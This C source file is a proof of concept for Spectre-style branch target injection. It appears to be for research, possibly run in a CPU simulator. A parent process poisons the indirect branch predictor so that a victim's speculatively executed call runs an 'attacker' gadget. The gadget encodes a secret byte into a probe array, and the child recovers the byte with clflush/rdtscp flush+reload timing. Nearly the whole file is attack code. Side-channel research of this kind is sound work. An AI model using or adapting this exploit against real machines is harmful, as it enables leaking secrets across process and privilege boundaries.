#include <stdint.h>
#include <x86intrin.h>
#include <stdio.h>
#include <sched.h>
#include <unistd.h>
#include <signal.h>


// cross address may not be possible since btb is indexed by thread: cpu/pred/btb.cc

size_t pagesize = 4096;
uint64_t *f;
char *probe_buf;
int junk;

int attacker(char *info){
    return probe_buf[*info * pagesize];
}

int safe(){
    return 42;
}

void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

int victim(char *info, int input){
    int junk = 0;
    for (int i =0; i < 100; i++){
        input += i;
        junk += input & i;
    }

    int result;

    __asm volatile("callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (*f)
                 : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");

    return result + junk;
}

int flush_reload_t(void *ptr) {
  register uint64_t start = 0, end = 0;
  start = __rdtscp(&junk);
  maccess(ptr);


  end = __rdtscp(&junk);
  flush(ptr);

  return (int)(end - start);
}

void main(){
    int junk = 0;
    int j,k;
    char trash = '#';
    int i = 0;
    probe_buf = malloc(256 * pagesize);
    int hits[256];

    char target = 'F';
    int mix_i;
    int start, end;
    char *addr;
    pid_t pid = 0;

    for (i = 0; i < 256; i++) {
        hits[i] = 0;
    }
    f = (uint64_t*)malloc(sizeof(uint64_t));


    pid = fork();

    for (int tries = 19; tries > 0; tries--){
        if (pid != 0){
            *f = (uint64_t)&attacker;
            _mm_mfence();
            for (i = 0; i < 50; i++){
                junk ^= victim(&trash,0);
            }
        } else{
            _mm_mfence();
            for (i = 0; i < 256; i++){
                _mm_clflush(probe_buf + i*pagesize);
            }

            _mm_mfence();
            *f = (uint64_t)&safe;
            _mm_mfence();

            _mm_clflush((void*)f);
            _mm_mfence();
            junk ^= victim(&target,0);
            //junk ^= probe_buf[90*pagesize];
            _mm_mfence();
            
            for (i = 0; i < 256; i++) {
                mix_i = ((i * 167) + 13) & 255;
                if (flush_reload_t(probe_buf + mix_i * pagesize) <= 80){
                    hits[mix_i]++;
                }
            }
        }
    }

    /* if (pid != 0){
        kill(pid, SIGTERM);
    } */

    // locate top two results
    j = k = -1;
    for (i = 0; i < 256; i++) {
        if (j < 0 || hits[i] >= hits[j]) {
            k = j;
            j = i;
        } else if (k < 0 || hits[i] >= hits[k]) {
            k = i;
        }
    }

    printf("%d\n",junk);
    printf("j,hits[j]: %c,%d\n",j,hits[j]);
    free(probe_buf);
}